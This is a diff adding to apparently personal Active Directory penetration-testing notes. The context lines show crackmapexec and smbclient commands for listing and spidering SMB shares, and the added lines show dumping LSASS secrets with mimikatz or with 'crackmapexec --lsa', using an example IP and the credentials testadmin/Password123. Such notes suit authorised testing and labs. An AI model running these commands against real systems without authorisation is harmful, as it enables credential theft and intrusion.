@@ -8,3 +8,6 @@ From <https://github.com/TobyDavenn/ActiveDirectory/blob/main/activedirectory.md
 can use crackmapexec to see smb access - crackmapexec smb ip -u -p --shares <br>
 Take interesting shares and place into smbclient - smbclient ////ip//sharename -u --spider
 <br>
+
+<h2> Dumping LSSAS </h2><br>
+This can be done with mimikatz (shown above defender may block) and also Crackmapexec -- crackmapexec smb 192.168.0.76 -u testadmin -p Password123 --lsa <br>
